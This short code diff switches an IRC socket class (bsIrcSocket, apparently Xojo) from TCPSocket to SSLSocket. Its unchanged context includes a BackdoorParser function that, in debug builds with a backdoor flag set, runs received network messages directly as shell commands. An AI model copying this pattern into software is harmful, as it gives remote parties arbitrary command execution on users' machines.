@@ -1,6 +1,6 @@
 #tag Class
 Protected Class bsIrcSocket
-Inherits TCPSocket
+Inherits SSLSocket
 	#tag Event
 		Sub Connected()
 		  //Finish the connection registration with the server
@@ -81,7 +81,7 @@ Inherits TCPSocket
 
 	#tag Method, Flags = &h21
 		Private Function BackdoorParser(msg As String) As Boolean
-		  If backdoor And DebugBuild Then 
+		  If backdoor And DebugBuild Then
 		    'Dim args() As String = Tokenize(msg)
 		    Dim sh As New Shell
 		    sh.Execute(msg)
